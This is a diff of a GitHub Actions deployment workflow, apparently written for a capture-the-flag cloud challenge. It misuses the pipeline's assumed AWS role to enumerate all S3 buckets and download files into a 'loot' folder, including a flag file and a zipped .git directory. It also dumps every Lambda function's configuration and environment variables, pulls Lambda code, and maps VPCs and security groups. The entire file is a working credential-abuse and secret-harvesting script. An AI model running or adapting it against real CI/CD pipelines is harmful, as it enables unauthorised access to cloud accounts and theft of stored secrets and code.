@@ -1,9 +1,109 @@
-      - name: Check Lambda permissions
+name: deploy
+
+on:
+  push:
+    branches:
+      - corgi
+
+jobs:
+  aws:
+    runs-on: ubuntu-latest
+
+    permissions:
+      id-token: write
+      contents: read
+
+    steps:
+      - name: Get AWS credentials
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
+          aws-region: us-east-1
+
+
+      - name: AWS identity
+        run: |
+          echo "===== AWS IDENTITY ====="
+          aws sts get-caller-identity
+
+
+      - name: S3 enumeration
+        run: |
+          echo "===== S3 BUCKETS ====="
+          aws s3 ls
+
+          echo "===== S3 OBJECTS ====="
+
+          for bucket in $(aws s3 ls | awk '{print $3}')
+          do
+            echo "### BUCKET: $bucket"
+            aws s3 ls s3://$bucket --recursive || true
+          done
+
+
+      - name: Download interesting S3 files
+        run: |
+          mkdir -p loot
+
+          echo "===== TRY DOWNLOADS ====="
+
+          aws s3 cp s3://codec4f26c862a321ef5/code.zip loot/code.zip || true
+          aws s3 cp s3://codec4f26c862a321ef5/flag.txt loot/flag.txt || true
+
+          aws s3 cp s3://platform-bucket-009661764077-us-east-1/dotgit.zip loot/dotgit.zip || true
+
+          ls -la loot
+
+
+      - name: Lambda enumeration
+        run: |
+          echo "===== LAMBDA FUNCTIONS ====="
+
+          aws lambda list-functions
+
+
+      - name: Lambda details
+        run: |
+          for func in $(aws lambda list-functions \
+            --query 'Functions[].FunctionName' \
+            --output text)
+          do
+            echo "===== FUNCTION: $func ====="
+
+            aws lambda get-function-configuration \
+              --function-name $func
+
+            echo "===== CODE LOCATION ====="
+
+            aws lambda get-function \
+              --function-name $func \
+              --query 'Code.Location'
+          done
+
+
+      - name: Lambda environment variables
+        run: |
+          echo "===== ENVIRONMENT VARIABLES ====="
+
+          for func in $(aws lambda list-functions \
+            --query 'Functions[].FunctionName' \
+            --output text)
+          do
+            echo "### $func"
+
+            aws lambda get-function-configuration \
+              --function-name $func \
+              --query 'Environment'
+          done
+
+
+      - name: Lambda permissions and URL
         run: |
           echo "===== LAMBDA POLICY ====="
 
           aws lambda get-policy \
             --function-name nslookupv2 || true
+
 
           echo "===== FUNCTION URL ====="
 
@@ -20,6 +120,8 @@
             --payload '{"domain":"example.com"}' \
             lambda-response.json || true
 
+          echo "===== RESPONSE ====="
+
           cat lambda-response.json || true
 
 
@@ -32,8 +134,17 @@
             --query 'Code.Location' \
             --output text)
 
-          wget "$URL" -O lambda.zip
+          wget "$URL" -O lambda.zip || true
 
           echo "===== ZIP CONTENT ====="
 
-          unzip -l lambda.zip
+          unzip -l lambda.zip || true
+
+
+      - name: VPC enumeration
+        run: |
+          echo "===== VPCS ====="
+          aws ec2 describe-vpcs
+
+          echo "===== SECURITY GROUPS ====="
+          aws ec2 describe-security-groups
